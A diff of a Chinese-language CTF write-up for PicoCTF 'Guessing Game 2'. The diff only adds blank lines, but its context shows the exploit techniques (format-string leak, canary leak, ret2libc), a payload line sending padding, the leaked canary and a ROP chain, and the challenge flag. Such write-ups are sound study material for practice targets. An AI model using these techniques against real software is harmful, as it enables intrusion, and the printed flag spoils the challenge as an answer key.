@@ -6,8 +6,10 @@ category: "Security/Practice/PicoCTF/PWN"
 ---
 
 # PicoCTF - Guessing Game 2
+
 ## Background
 fmt / leak libc / ret2libc / leak canary
+
 ## Source code
 :::spoiler Source Code
 ```cpp=
@@ -100,6 +102,7 @@ int main(int argc, char **argv){
 }
 ```
 :::
+
 ## Recon
 寫這一題的時候切記不要隨便因為`Error /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.34' not found`的錯誤訊息而更新glibc，也就是下`sudo apt install libc6`這個command，經過實測是因為他給的elf執行檔有點問題，只要重新make就好，不然在用gdb trace code的時候，就會GG
 ```bash!
@@ -240,6 +243,7 @@ $ checksec vuln
     r.recvuntil(b'Name? ')
     r.sendline(b'a' * (0x200) + p32(canary_value) + b'a' * 0xc + ROP_payload)
     ```
+
 ## Exploit - ROP gadget / leak libc / leak Canary
 這一題算是綜合蠻多stack vulnerability的技巧，所以過程蠻複雜的，但只要環境對了就很順利
 ```python=
@@ -320,5 +324,6 @@ r.interactive()
 ```
 
 Flag: `picoCTF{p0p_r0p_4nd_dr0p_1t_73d8dcc827619318}`
+
 ## Reference
 [PicoCTF — Guessing Game 2 Walkthrough | ret2libc, stack cookies](https://captain-woof.medium.com/picoctf-guessing-game-2-walkthrough-ret2libc-stack-cookies-6f9fc39273bf)
